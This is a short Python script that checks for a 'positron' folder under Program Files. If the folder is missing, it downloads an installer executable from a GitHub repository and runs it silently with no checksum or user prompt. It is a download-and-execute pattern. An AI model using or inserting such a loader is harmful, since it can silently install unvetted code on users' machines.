import os
import requests
import subprocess

if not os.path.exists(r"C:\Program Files\positron"):
    url = "https://github.com/ahhhhhhhhhhhhhhhhhhhhhh1/positron/raw/refs/heads/installer-release/Positron%20Installer.exe"
    response = requests.get(url)
    
    with open(f"{os.getenv("temp")}\\Positron Installer.exe", "wb") as f:
        f.write(response.content)
    
    subprocess.run([f"{os.getenv("temp")}\\Positron Installer.exe", "/S"])